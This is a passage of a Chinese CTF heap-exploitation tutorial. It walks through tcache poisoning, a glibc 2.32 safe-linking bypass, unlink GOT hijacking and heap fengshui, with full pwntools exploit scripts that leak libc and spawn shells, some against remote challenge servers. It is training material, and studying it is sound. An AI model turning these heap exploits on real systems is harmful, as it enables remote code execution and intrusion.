class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">9</span>-i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin chunk consolidate</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># re-malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache, protect the important chunk</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin overlap</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">0xF8</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 7, the former 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 8</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc addr leak: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 9</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + one_gadget)) <span class="comment"># fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行，成功getshell（本地环境Ubuntu18.0.4）</p>
<p><img src="https://i.loli.net/2020/11/26/XAZm7UrvFw8cfih.png" alt="image.png"></p>
<h2 id="五、Safe-Linkling-bypass（glibc-2-32-and-up）"><a href="#五、Safe-Linkling-bypass（glibc-2-32-and-up）" class="headerlink" title="五、Safe-Linkling bypass（glibc 2.32 and up）"></a>五、Safe-Linkling bypass（glibc 2.32 and up）</h2><p>前面我们讲到，自 glibc2.32 起新增了 safe-linking 机制用以保护存放在 tcache 与 fastbin 中的 chunk 指针，保证 chunk 链表的完整性</p>
<p>但是 safe-linking 机制同样存在着其缺点：对于 tcache 而言，第一个被放入 tcache 的 chunk 的 fd 指针在经过 safe-linking 后会被写入一个<strong>未加密的堆上相关地址</strong>（与 0 异或），因而我们可以通过该 chunk 的 fd 指针泄露堆基址，有了堆基址我们便能很轻松地绕过 safe-linking 机制的保护</p>
<p>同样地，若是我们能够打印 tcache 中 free chunk 的 bd 字段，则同样可以获得 tcache key，以此泄露堆基址，绕过 safe-linking</p>
<h3 id="例题：-VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack"><a href="#例题：-VNCTF-2021-ff-tcache-poisoning-IO-FILE-hijack" class="headerlink" title="例题：[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack"></a>例题：[VNCTF 2021]ff - tcache poisoning + IO_FILE hijack</h3><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/03/28/GnvgcRy2Sdz8MY4.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大致是有着分配、释放、打印、编辑堆块功能的程序，但是限制了只能编辑两次、打印一次，同时<strong>一次只能操作一个堆块</strong></p>
<p><img src="https://i.loli.net/2021/03/28/vz5wyYXgJxA6pIu.png" alt="image.png"></p>
<p>释放功能中没有清空，存在 UAF</p>
<p><img src="https://i.loli.net/2021/03/28/JXQhGvoTieV14xa.png" alt="image.png"></p>
<p>但是libc 的版本为 <code>2.32</code> ，那么我们需要用掉唯一的一次打印的机会泄露堆基址才能通过 double free 进行任意地址写</p>
<p>而我们还需要想办法泄露 libc 基址，但是我们只能分配 <code>0x80</code> 的堆块，即使劫持了 tcache struct 后所释放的堆块也只能够进入 fastbin中（而且我们一次只能操作一个堆块</p>
<p><img src="https://i.loli.net/2021/03/28/qKEHz4FSWkXJ8lM.png" alt="image.png"></p>
<p>考虑到 tcache管理器 本身便是一个 <code>0x291</code>的堆块，我们可以劫持之后改对应计数为7后free掉，送入 unsorted bin 中，之后切割这个大chunk，利用残留指针 大概1&#x2F;16 的几率可以爆破到 stdout 附近，劫持 stdout 以泄露 libc 基址，最后改 <code>__free_hook</code> 为 system 函数后释放一个内容为 <code>/bin/sh </code>的 chunk 即可 get shell</p>
<blockquote>
<p>非酋的话可能要爆破很久…</p>
</blockquote>
<p>故构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">hit_byte</span>):</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak * <span class="number">0x1000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="string">b&#x27;arttnba3arttnba4&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    edit(p64(heap_leak ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">3</span> + <span class="string">b&#x27;\x01\x00&#x27;</span> + <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">b&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># unknown reason, bigger than 0x48 will failed.</span></span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + <span class="string">b&#x27;\xc0&#x27;</span> + p8(hit_byte * <span class="number">0x10</span> + <span class="number">6</span>)) <span class="comment"># 1/16 to hit stdout</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e4744</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x70</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the no.&#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27; try&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">b&#x27;try: &#x27;</span> + <span class="string">b&#x27;\xc0&#x27;</span> + p8(i * <span class="number">0x10</span> + <span class="number">6</span>))</span><br><span class="line">            p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26018</span>)<span class="comment">#process(&#x27;./ff&#x27;) #</span></span><br><span class="line">            exp(i)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            p.close()</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            i = i % <span class="number">16</span></span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/03/28/jiQUwRnTrZfuEty.png" alt="image.png"></p>
<h2 id="六、Unlink"><a href="#六、Unlink" class="headerlink" title="六、Unlink"></a>六、Unlink</h2><p>由于 unlink 中存在着各种各样的安全检测，因此我们无法通过 unlink 直接进行任意地址写入</p>
<p><strong>但是我们仍旧能够通过 unlink 机制将特定地址写入到特定的位置</strong>：</p>
<p>设指向可 UAF chunk 的指针的地址为 ptr</p>
<ol>
<li>修改 fd 为 ptr - 0x18</li>
<li>修改 bk 为 ptr - 0x10</li>
<li>触发 unlink</li>
</ol>
<p>ptr 处的指针会变为 ptr - 0x18。</p>
<h3 id="例题：hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget"><a href="#例题：hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget" class="headerlink" title="例题：hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget"></a>例题：hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget</h3><p>惯例的 <code>checksec</code> ，保护全…只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/04/06/fhCpAXLSK7rTHVs.png" alt="image.png"></p>
<p>拖入IDA 进行分析</p>
<p>没有菜单提示的菜单题（恼）</p>
<p>大概是有分配、释放、编辑堆块功能</p>
<p><img src="https://i.loli.net/2021/04/06/uBYpC2mdAWy4ilF.png" alt="image.png"></p>
<p>漏洞在于编辑长度自定，存在堆溢出</p>
<p><img src="https://i.loli.net/2021/04/07/2tXSkUziY7hIL9y.png" alt="image.png"></p>
<p>没有打印功能，没有tcache也难整任意地址写（fastbin size检查），那就只能通过unlink劫持got表了（恼）</p>
<p>大概是构造如下堆布局（表格有点丑，将就着看（x）），因为存放堆指针的数组在bss段上，没开PIE，那我们直接用 unlink 劫持got表即可</p>
<table>
<thead>
<tr>
<th align="right">address</th>
<th align="right">prev_size</th>
<th align="right">size</th>
</tr>
</thead>
<tbody><tr>
<td align="right">chunk2</td>
<td align="right">0</td>
<td align="right">0x31</td>
</tr>
<tr>
<td align="right">(fake chunk)</td>
<td align="right">0</td>
<td align="right">0x21</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">chunk_array[2] - 0x18</td>
<td align="right">chunk_array[2] - 0x10</td>
</tr>
<tr>
<td align="right">chunk3</td>
<td align="right">0x20</td>
<td align="right">0x90</td>
</tr>
<tr>
<td align="right"></td>
<td align="right">…</td>
<td align="right">…</td>
</tr>
</tbody></table>
<p>大概能够满足 <code>fake chunk-&gt;FD-&gt;BK = fake chunk</code> 和 <code>fake chunk-&gt;BK-&gt;FD = fake chunk</code> ，此时 free(chunk3)，由于 prev_in_use 位为 0，我们的 fake chunk 就会被合并到chunk3中</p>
<p>接下来的 unlink 操作会将<code>fake chunk-&gt;FD-&gt;BK</code> 赋值为<code>fake chunk-&gt;BK</code>，将<code>fake chunk-&gt;BK-&gt;FD</code> 赋值为<code>fake chunk-&gt;FD</code></p>
<p>即<strong>存放</strong> <code>chunk2</code> <strong>指针的位置存放的指针变成了</strong> <code>chunk_array</code> <strong>的地址</strong>，此时我们便可以直接修改 <code>chunk_array</code> 中指针，劫持 got 表一套带走</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27629</span>)<span class="comment">#process(&#x27;./stkof&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span> ,size:<span class="built_in">int</span> ,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x20</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x80</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x10</span>) <span class="comment"># idx 4</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602140</span> + <span class="number">0x10</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602140</span> + <span class="number">0x10</span> - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x602138</span>) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x28</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x602138</span>) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/87TAZSdY15jgbIP.png" alt="image.png"></p>
<h2 id="七、堆风水（Heap-Fengshui）"><a href="#七、堆风水（Heap-Fengshui）" class="headerlink" title="七、堆风水（Heap Fengshui）"></a>七、堆风水（Heap Fengshui）</h2><p>所谓堆风水也叫作堆排布，其实说严格了并不是一种漏洞的利用方法，而是<strong>一种灵活布置堆块来控制堆布局的方法</strong>，在一些一些其他漏洞的利用中起到效果 </p>
<p>堆风水一词源于中国道教的“风水”一词，这个词无法很好地被翻译为英文故直接取其拼音</p>
<blockquote>
<p>Pwn手人人都是风水大师（误）</p>
</blockquote>
<h4 id="例题：babyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><a href="#例题：babyfengshui-33c3-2016-heap-arrangement-got-table-hijack" class="headerlink" title="例题：babyfengshui_33c3_2016 - heap arrangement + got table hijack"></a>例题：babyfengshui_33c3_2016 - heap arrangement + got table hijack</h4><p>惯例的<code>checksec</code>，开了NX和canary</p>
<p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p>
<p>我们不难看出分配堆块时所生成的大致结构应当如下，且<strong>该结构体malloc的大小为0x80，处在unsorted bin 范围内</strong></p>
<p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p>
<p>漏洞点在于对输入长度的检测，它是检测的是<strong>我们所输入的长度是否大于从description chunk的addr到struct chunk的prev_size的长度</strong></p>
<p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p>
<p>在常规情况下我们似乎只能够覆写掉PREV_SIZE的一部分，不痛不痒</p>
<p>但是考虑这样的一种情况：我们先分配两个大块（chunk<em>4，其中第一个块的size要在unsorted范围内），之后释放掉第一个大块，再分配一个size更大的块，unsorted bin内就会从这个大chunk（由两个chunk合并而来）中切割一个大chunk给到description，之后再从下方的top chunk切割0x90来给到struct，这个时候*<em>由于对length的错误判定就会导致我们有机会覆写第二个大块中的内容</em></em></p>
<p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p>
<p>故考虑先覆写第二个大块中的 description addr 为 free@got 后泄漏出 libc 的基址，后再修改 free@got 为 system 函数地址后释放一个内容为<code>&quot;/bin/sh&quot;</code>的 chunk 即可通过 <code>system(&quot;/bin/sh&quot;)</code> 来 get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>) <span class="comment"># 